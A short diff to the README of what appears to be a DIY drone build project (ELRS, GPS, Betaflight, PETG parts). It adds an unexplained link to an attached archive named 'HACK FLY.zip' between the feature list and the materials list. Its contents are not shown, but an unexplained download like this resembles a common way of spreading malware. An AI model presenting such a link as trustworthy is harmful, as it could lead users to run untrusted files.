@@ -36,6 +36,8 @@ Low-latency and long-range control using ELRS.
 GPS support for navigation and failsafe features.
 Fully configurable through Betaflight.
 
+[HACK FLY.zip](https://github.com/user-attachments/files/26647902/HACK.FLY.zip)
+
 
 3D print material:
 PETG- Top plate, Bottom plate.
